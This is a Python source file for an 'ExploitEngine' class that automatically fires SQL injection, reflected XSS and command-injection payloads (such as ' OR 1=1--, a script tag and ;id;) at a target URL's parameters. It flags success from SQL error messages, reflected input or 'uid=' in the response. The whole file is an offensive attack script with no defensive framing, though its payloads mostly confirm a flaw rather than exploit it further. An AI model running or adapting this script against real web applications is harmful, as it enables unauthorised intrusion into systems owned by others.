import requests
from urllib.parse import urljoin

class ExploitEngine:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CodeShacks Exploit Engine'})

    def exploit_sqli(self, url, param):
        """Exploit SQL injection vulnerability"""
        payloads = [
            "' OR '1'='1'--",
            "' OR 1=1--",
            "admin'--"
        ]
        for payload in payloads:
            try:
                params = {param: payload}
                response = self.session.get(url, params=params)
                if "error in your SQL syntax" in response.text.lower():
                    return True, f"SQLi vulnerable with payload: {payload}"
            except Exception as e:
                continue
        return False, "No SQLi vulnerability found"

    def exploit_xss(self, url, param):
        """Exploit XSS vulnerability"""
        payload = "<script>alert('XSS')</script>"
        try:
            params = {param: payload}
            response = self.session.get(url, params=params)
            if payload in response.text:
                return True, f"XSS vulnerable with payload: {payload}"
        except Exception as e:
            pass
        return False, "No XSS vulnerability found"

    def exploit_rce(self, url, param):
        """Exploit potential RCE vulnerability"""
        payloads = [
            ";id;",
            "|id",
            "`id`"
        ]
        for payload in payloads:
            try:
                params = {param: payload}
                response = self.session.get(url, params=params)
                if "uid=" in response.text:
                    return True, f"Possible RCE with payload: {payload}"
            except Exception as e:
                continue
        return False, "No RCE vulnerability found"

    def auto_exploit(self, vulnerabilities):
        """Automatically exploit found vulnerabilities"""
        results = []
        for vuln in vulnerabilities:
            if vuln['type'] == 'SQL Injection':
                success, msg = self.exploit_sqli(vuln['url'], vuln['parameter'])
                results.append({'vulnerability': 'SQL Injection', 'success': success, 'message': msg})
            elif vuln['type'] == 'XSS':
                success, msg = self.exploit_xss(vuln['url'], vuln['parameter'])
                results.append({'vulnerability': 'XSS', 'success': success, 'message': msg})
            elif vuln['type'] == 'RCE':
                success, msg = self.exploit_rce(vuln['url'], vuln['parameter'])
                results.append({'vulnerability': 'RCE', 'success': success, 'message': msg})
        return results
